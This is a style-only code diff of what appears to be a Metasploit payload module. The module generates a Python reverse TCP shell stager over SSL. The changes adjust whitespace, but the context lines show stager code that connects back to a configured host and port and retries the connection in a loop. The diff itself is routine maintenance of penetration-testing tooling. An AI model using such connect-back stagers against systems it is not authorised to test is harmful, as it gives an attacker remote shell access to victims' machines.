@@ -19,11 +19,9 @@ module Payload::Python::ReverseTcpSsl
     super
     register_advanced_options([
         OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 10]),
-        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts',5])
+        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts', 5])
       ], self.class)
   end
-  
-  
 
   #
   # Generate the first stage
@@ -59,8 +57,8 @@ module Payload::Python::ReverseTcpSsl
       cmd << "so.connect(('#{opts[:host]}',#{opts[:port]}))\n"
       cmd << "s=ssl.wrap_socket(so)\n"
     else
-      if opts[:retry_count]>0
-        cmd << "for x in range(#{opts[:retry_count].to_i}):\n" 
+      if opts[:retry_count] > 0
+        cmd << "for x in range(#{opts[:retry_count].to_i}):\n"
       else
         cmd << "while 1:\n"
       end
